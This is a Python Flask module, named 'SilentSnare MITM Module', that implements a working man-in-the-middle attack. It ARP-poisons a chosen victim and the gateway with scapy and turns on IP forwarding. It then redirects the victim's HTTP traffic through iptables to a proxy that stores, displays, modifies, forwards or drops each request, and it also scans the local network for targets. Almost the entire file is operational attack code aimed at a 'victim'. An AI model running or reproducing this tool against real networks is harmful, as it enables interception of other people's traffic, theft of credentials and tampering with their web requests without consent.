# -*- coding: utf-8 -*-
# scenarios.py – SilentSnare MITM Module (Final)
import subprocess
import os
import time
import threading
import re
import socket
import socketserver
import logging
from functools import wraps
from flask import Blueprint, jsonify, render_template, request
from scapy.all import ARP, Ether, srp, sendp, get_if_hwaddr
import netifaces
import ipaddress
from database.db import get_db

# إعداد logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bp = Blueprint('scenarios', __name__)

socketio_instance = None
def init_socketio(sio):
    global socketio_instance
    socketio_instance = sio

def json_response(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        try:
            return f(*args, **kwargs)
        except Exception as e:
            return jsonify({'success': False, 'error': str(e)}), 500
    return decorated

# ========== ARP Variables ==========
arp_spoof_active = False
arp_victim_ip = None
arp_gateway_ip = None
arp_interface = None
arp_thread = None

# ========== HTTP Interception Variables ==========
http_intercept_active = False
http_proxy_thread = None
http_proxy_server = None
http_proxy_port = 8080
http_victim_ip = None

intercepted_requests = []
intercepted_lock = threading.Lock()

# ========== ARP Functions ==========
def get_mac(ip, iface):
    try:
        ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, iface=iface, verbose=0)
        return ans[0][0][1].hwsrc if ans[0] else None
    except:
        return None

def arp_spoof_pair(ip1, ip2, interface, stop_flag):
    mac1 = get_mac(ip1, interface)
    mac2 = get_mac(ip2, interface)
    attacker_mac = get_if_hwaddr(interface)
    if not mac1 or not mac2:
        logger.error(f"[ARP] Could not get MAC for {ip1} or {ip2}")
        return
    logger.info(f"[ARP] Starting poisoning between {ip1} and {ip2}")
    while not stop_flag():
        sendp(Ether(src=attacker_mac, dst=mac1)/ARP(op=2, pdst=ip1, hwdst=mac1, psrc=ip2, hwsrc=attacker_mac),
              iface=interface, verbose=0)
        sendp(Ether(src=attacker_mac, dst=mac2)/ARP(op=2, pdst=ip2, hwdst=mac2, psrc=ip1, hwsrc=attacker_mac),
              iface=interface, verbose=0)
        time.sleep(2)

def restore_arp_pair(ip1, ip2, interface):
    mac1 = get_mac(ip1, interface)
    mac2 = get_mac(ip2, interface)
    if mac1 and mac2:
        sendp(Ether(dst=mac1)/ARP(op=2, pdst=ip1, hwdst=mac1, psrc=ip2, hwsrc=mac2),
              iface=interface, count=5, inter=0.2, verbose=0)
        sendp(Ether(dst=mac2)/ARP(op=2, pdst=ip2, hwdst=mac2, psrc=ip1, hwsrc=mac1),
              iface=interface, count=5, inter=0.2, verbose=0)

# ========== ARP Endpoints ==========
@bp.route('/start_arp_spoof', methods=['POST'])
@json_response
def start_arp_spoof():
    global arp_spoof_active, arp_thread, arp_victim_ip, arp_gateway_ip, arp_interface

    if arp_spoof_active:
        return {'status': 'error', 'message': 'ARP already running'}

    data = request.get_json()
    arp_victim_ip = data.get('victim_ip')
    arp_gateway_ip = data.get('gateway_ip')
    arp_interface = data.get('interface', 'eth0')

    if not arp_victim_ip or not arp_gateway_ip:
        return {'status': 'error', 'message': 'Missing IPs'}

    arp_spoof_active = True

    def stop_flag():
        return not arp_spoof_active

    def run():
        subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=1'], check=False)
        arp_spoof_pair(arp_victim_ip, arp_gateway_ip, arp_interface, stop_flag)

    arp_thread = threading.Thread(target=run, daemon=True)
    arp_thread.start()

    logger.info(f"[ARP] Attack started: {arp_victim_ip} ↔ {arp_gateway_ip}")

    return {'status': 'success', 'message': 'ARP spoofing started'}

@bp.route('/stop_arp_spoof', methods=['POST'])
@json_response
def stop_arp_spoof():
    global arp_spoof_active

    if not arp_spoof_active:
        return {'status': 'error', 'message': 'ARP not running'}

    arp_spoof_active = False

    restore_arp_pair(arp_victim_ip, arp_gateway_ip, arp_interface)

    subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=0'], check=False)

    logger.info("[ARP] Attack stopped")

    return {'status': 'success', 'message': 'ARP spoofing stopped'}

@bp.route('/arp_status', methods=['GET'])
def arp_status():
    return jsonify({
        'active': arp_spoof_active,
        'victim': arp_victim_ip,
        'gateway': arp_gateway_ip
    })

# ========== IPTables for HTTP (victim-specific with error logging) ==========
def add_http_redirect(victim_ip):
    remove_http_redirect(victim_ip)
    cmd = [
        "sudo", "iptables", "-t", "nat", "-I", "PREROUTING",
        "-s", victim_ip,
        "-p", "tcp", "--dport", "80",
        "-j", "REDIRECT", "--to-port", str(http_proxy_port)
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        logger.error(f"[HTTP] iptables add failed: {result.stderr}")
        raise Exception(f"iptables add failed: {result.stderr}")
    logger.info(f"[HTTP] iptables rule added: redirect {victim_ip}:80 -> {http_proxy_port}")

def remove_http_redirect(victim_ip=None):
    if victim_ip:
        cmd = [
            "sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
            "-s", victim_ip,
            "-p", "tcp", "--dport", "80",
            "-j", "REDIRECT", "--to-port", str(http_proxy_port)
        ]
    else:
        cmd = [
            "sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
            "-p", "tcp", "--dport", "80",
            "-j", "REDIRECT", "--to-port", str(http_proxy_port)
        ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        logger.warning(f"[HTTP] iptables remove failed (maybe rule not present): {result.stderr}")
    else:
        logger.info("[HTTP] iptables rule removed")

# ========== Helper: Add Connection: close to request/response ==========
def ensure_connection_close_in_request(request_data):
    """Add Connection: close header to the request if not present."""
    lines = request_data.split('\r\n')
    header_end = -1
    for i, line in enumerate(lines):
        if line == '':
            header_end = i
            break
    if header_end == -1:
        return request_data
    headers = lines[:header_end]
    body = lines[header_end+1:]
    has_connection = any(h.lower().startswith('connection:') for h in headers)
    if not has_connection:
        headers.insert(1, 'Connection: close')
    elif any('Connection: keep-alive' in h for h in headers):
        headers = [h.replace('Connection: keep-alive', 'Connection: close') for h in headers]
    return '\r\n'.join(headers) + '\r\n\r\n' + '\r\n'.join(body)

def ensure_connection_close_in_response(response):
    """Add Connection: close header to the response if not present."""
    if not response:
        return response
    try:
        header_end = response.find(b'\r\n\r\n')
        if header_end == -1:
            return response
        headers = response[:header_end]
        body = response[header_end+4:]
        if b'Connection: close' not in headers and b'Connection: keep-alive' not in headers:
            lines = headers.split(b'\r\n')
            lines.insert(1, b'Connection: close')
            new_headers = b'\r\n'.join(lines)
            return new_headers + b'\r\n\r\n' + body
        elif b'Connection: keep-alive' in headers:
            new_headers = headers.replace(b'Connection: keep-alive', b'Connection: close')
            return new_headers + b'\r\n\r\n' + body
    except Exception as e:
        logger.error(f"Error injecting Connection: close in response: {e}")
    return response

# ========== HTTP Proxy Handler ==========
class HTTPProxyHandler(socketserver.StreamRequestHandler):
    def handle(self):
        client_ip = self.client_address[0]
        try:
            self.connection.settimeout(10)

            # Read request line and headers
            request_data = b""
            content_length = 0
            while True:
                line = self.rfile.readline()
                if not line:
                    break
                request_data += line
                if line in (b'\r\n', b'\n'):
                    break
                lower_line = line.lower()
                if lower_line.startswith(b'content-length:'):
                    content_length = int(line.split(b':')[1].strip())

            if content_length > 0:
                body = self.rfile.read(content_length)
                request_data += body

            if not request_data:
                return

            req_id = int(time.time()*1000)
            event = threading.Event()
            req_entry = {
                'id': req_id,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'src_ip': client_ip,
                'data': request_data.decode('utf-8', errors='ignore'),
                'modified_data': None,
                'event': event,
                'response': None
            }

            with intercepted_lock:
                intercepted_requests.append(req_entry)

            # Save to DB
            lines_raw = req_entry['data'].split('\r\n')
            first_line = lines_raw[0] if lines_raw else ''
            parts_raw = first_line.split(' ')
            method_raw = parts_raw[0] if parts_raw else 'HTTP'
            host_match_raw = re.search(r'Host:\s*([^\r\n]+)', req_entry['data'], re.IGNORECASE)
            dst_host = host_match_raw.group(1).strip() if host_match_raw else 'unknown'
            try:
                with get_db() as db:
                    db.execute("""
                        INSERT INTO packets
                        (src_ip, dst_ip, protocol, length, payload, is_secure, src_port, dst_port)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                    """, (
                        client_ip, dst_host,
                        f'HTTP ({method_raw})',
                        len(request_data),
                        req_entry['data'][:2000],
                        0, 0, 80
                    ))
            except Exception as db_err:
                logger.error(f"[HTTP Proxy] DB error: {db_err}")

            logger.info(f"[HTTP Proxy] Intercepted request ID: {req_id} from {client_ip}")

            # Wait for frontend to release (increased to 120 seconds)
            event.wait(timeout=120)

            if req_entry['response'] is None:
                self.wfile.write(b"HTTP/1.1 408 Request Timeout\r\nContent-Length: 0\r\n\r\n")
                self.wfile.flush()
                logger.warning(f"[HTTP Proxy] Request {req_id} timed out")
            else:
                # Inject Connection: close into response before sending
                final_response = ensure_connection_close_in_response(req_entry['response'])
                self.wfile.write(final_response)
                self.wfile.flush()
                logger.info(f"[HTTP Proxy] Response sent to {client_ip} for request {req_id}, size {len(final_response)}")
                self.connection.close()

        except Exception as e:
            logger.error(f"[HTTP Proxy] Error handling request from {client_ip}: {e}")
            try:
                self.wfile.write(b"HTTP/1.1 502 Bad Gateway\r\nContent-Length: 0\r\n\r\n")
                self.wfile.flush()
                self.connection.close()
            except:
                pass

class ThreadedHTTPProxyServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True

def start_http_proxy(port):
    global http_proxy_server, http_proxy_thread
    if http_proxy_server is None:
        http_proxy_server = ThreadedHTTPProxyServer(('0.0.0.0', port), HTTPProxyHandler)
        http_proxy_thread = threading.Thread(target=http_proxy_server.serve_forever, daemon=True)
        http_proxy_thread.start()
        logger.info(f"[HTTP Proxy] Started on port {port}")

def stop_http_proxy():
    global http_proxy_server, http_proxy_thread
    if http_proxy_server:
        http_proxy_server.shutdown()
        http_proxy_server.server_close()
        http_proxy_server = None
        http_proxy_thread = None
        logger.info("[HTTP Proxy] Stopped")

# ========== HTTP Endpoints ==========
@bp.route('/start_http_intercept', methods=['POST'])
@json_response
def start_http_intercept():
    global http_intercept_active, http_victim_ip
    if http_intercept_active:
        return {'status':'error','message':'HTTP interception already active'}

    if not arp_spoof_active or not arp_victim_ip:
        return {'status':'error','message':'ARP spoofing must be active first (victim IP needed)'}

    start_http_proxy(http_proxy_port)

    try:
        add_http_redirect(arp_victim_ip)
    except Exception as e:
        # If iptables fails, stop the proxy and return error
        stop_http_proxy()
        return {'status':'error','message': str(e)}

    http_intercept_active = True
    http_victim_ip = arp_victim_ip
    logger.info(f"[HTTP] Interception started for victim {arp_victim_ip}")
    return {'status':'success','message':f'HTTP interception started for victim {arp_victim_ip}'}

@bp.route('/stop_http_intercept', methods=['POST'])
@json_response
def stop_http_intercept():
    global http_intercept_active, http_victim_ip
    if not http_intercept_active:
        return {'status':'error','message':'HTTP interception not active'}

    http_intercept_active = False

    if http_victim_ip:
        remove_http_redirect(http_victim_ip)
    else:
        remove_http_redirect()

    stop_http_proxy()

    http_victim_ip = None
    logger.info("[HTTP] Interception stopped")
    return {'status':'success','message':'HTTP interception stopped'}

@bp.route('/http_intercept_status', methods=['GET'])
@json_response
def http_intercept_status():
    return {
        'active': http_intercept_active,
        'victim': http_victim_ip,
        'arp_active': arp_spoof_active,
        'arp_victim': arp_victim_ip
    }

@bp.route('/get_http_request', methods=['GET'])
@json_response
def get_http_request():
    with intercepted_lock:
        if not intercepted_requests:
            return {'status': 'waiting'}

        latest = intercepted_requests[-1]
        request_data = latest['modified_data'] if latest['modified_data'] is not None else latest['data']
        data_str = request_data
        lines = data_str.split('\r\n')
        first_line = lines[0] if lines else ''
        parts = first_line.split(' ')
        method = parts[0] if len(parts) > 0 else '?'
        path = parts[1] if len(parts) > 1 else '?'
        host_match = re.search(r'Host:\s*([^\r\n]+)', data_str, re.IGNORECASE)
        host = host_match.group(1).strip() if host_match else '?'

        safe_req = {
            'id': latest['id'],
            'timestamp': latest['timestamp'],
            'src_ip': latest['src_ip'],
            'dst_ip': host,
            'method': method,
            'path': path,
            'data': request_data
        }
        return {'status': 'success', 'request': safe_req}

@bp.route('/update_http_request', methods=['POST'])
@json_response
def update_http_request():
    data = request.get_json()
    req_id = data.get('id')
    new_payload = data.get('payload')
    if not req_id or new_payload is None:
        return {'status': 'error', 'message': 'Missing id or payload'}

    with intercepted_lock:
        req = next((r for r in intercepted_requests if r['id'] == req_id), None)
        if not req:
            return {'status': 'error', 'message': 'Request not found'}

        req['modified_data'] = new_payload
        logger.info(f"[HTTP] Updated request ID {req_id} with new payload")

    return {'status': 'success', 'message': 'Request updated'}

@bp.route('/get_intercepted_requests', methods=['GET'])
@json_response
def get_intercepted_requests():
    with intercepted_lock:
        return {'requests':[{'id':r['id'], 'timestamp':r['timestamp'], 'src_ip':r['src_ip']} for r in intercepted_requests]}

@bp.route('/release_request', methods=['POST'])
@json_response
def release_request():
    data = request.get_json()
    req_id = data.get('id')
    with intercepted_lock:
        req = next((r for r in intercepted_requests if r['id'] == req_id), None)
    if not req:
        return {'status':'error','message':'Request not found'}

    payload_to_send = req['modified_data'] if req['modified_data'] is not None else req['data']
    if not payload_to_send:
        return {'status':'error','message':'No payload to send'}

    # Add Connection: close to request
    payload_to_send = ensure_connection_close_in_request(payload_to_send)

    # Parse host from payload
    lines = payload_to_send.split('\r\n')
    first_line = lines[0] if lines else ''
    parts = first_line.split(' ')
    if len(parts) < 2:
        return {'status':'error','message':'Invalid request line'}
    host_match = re.search(r'Host:\s*([^\r\n]+)', payload_to_send, re.IGNORECASE)
    if not host_match:
        return {'status':'error','message':'No Host header'}
    host = host_match.group(1).strip()
    port = 80
    if ':' in host:
        host, port = host.split(':')
        port = int(port)

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(30)  # Increased timeout for server response
        sock.connect((host, port))
        sock.sendall(payload_to_send.encode('utf-8'))

        # Read response until socket closes (EOF) or timeout
        response_parts = []
        while True:
            try:
                chunk = sock.recv(8192)
                if not chunk:
                    break
                response_parts.append(chunk)
            except socket.timeout:
                logger.warning(f"[HTTP] Timeout while reading response from {host}:{port}")
                break
        response = b''.join(response_parts)
        sock.close()

        # Log first 200 bytes for debugging
        logger.info(f"[HTTP] Response first 200 bytes: {response[:200]}")

        # Inject Connection: close into response
        response = ensure_connection_close_in_response(response)

        req['response'] = response
        req['event'].set()
        with intercepted_lock:
            intercepted_requests.remove(req)
        logger.info(f"[HTTP] Request {req_id} forwarded to {host}:{port}, response size {len(response)}")
        return {'status':'success','message':'Request sent, response returned'}
    except Exception as e:
        logger.error(f"[HTTP] Error forwarding request {req_id}: {e}")
        return {'status':'error','message':str(e)}

@bp.route('/drop_http', methods=['POST'])
@json_response
def drop_http():
    data = request.get_json()
    req_id = data.get('id')
    with intercepted_lock:
        req = next((r for r in intercepted_requests if r['id'] == req_id), None)
        if req:
            req['event'].set()
            intercepted_requests.remove(req)
            logger.info(f"[HTTP] Request {req_id} dropped")
            return {'status': 'success', 'message': 'Request dropped'}
    return {'status': 'error', 'message': 'Request not found'}

@bp.route('/clear_intercepted', methods=['POST'])
@json_response
def clear_intercepted():
    with intercepted_lock:
        intercepted_requests.clear()
    logger.info("[HTTP] Cleared intercepted queue")
    return {'status':'success','message':'Cleared intercepted requests'}

# ========== Frontend ==========
@bp.route('/')
def index():
    return render_template('scenarios.html')

# ========== Network Scan ==========
@bp.route('/scan_network', methods=['POST'])
@json_response
def scan_network():
    data = request.get_json()
    interface = data.get('interface','eth0')
    try:
        addrs = netifaces.ifaddresses(interface)
        ip_info = addrs[netifaces.AF_INET][0]
        network = ipaddress.IPv4Network(f"{ip_info['addr']}/{ip_info['netmask']}", strict=False)
        arp_req = ARP(pdst=str(network))
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        answered = srp(broadcast/arp_req, timeout=5, iface=interface, verbose=0)[0]
        devices = [{'ip':rcv.psrc,'mac':rcv.hwsrc} for _,rcv in answered]
        return {'status':'success','devices':devices}
    except Exception as e:
        return {'status':'error','message':str(e)}

# ========== Cleanup ==========
def cleanup():
    global arp_spoof_active, arp_victim_ip, arp_gateway_ip, arp_interface, arp_thread
    global http_intercept_active, http_victim_ip
    logger.info("🧹 Cleaning up scenario 1 resources...")
    if arp_spoof_active:
        arp_spoof_active = False
        if arp_thread and arp_thread.is_alive():
            arp_thread.join(timeout=3)
        if arp_victim_ip and arp_gateway_ip and arp_interface:
            restore_arp_pair(arp_victim_ip, arp_gateway_ip, arp_interface)
        subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=0'], check=False)
        arp_victim_ip = arp_gateway_ip = arp_interface = None
        arp_thread = None
    if http_intercept_active:
        http_intercept_active = False
        if http_victim_ip:
            remove_http_redirect(http_victim_ip)
        stop_http_proxy()
        http_victim_ip = None
    with intercepted_lock:
        intercepted_requests.clear()
    logger.info("✅ Scenario 1 cleanup done")
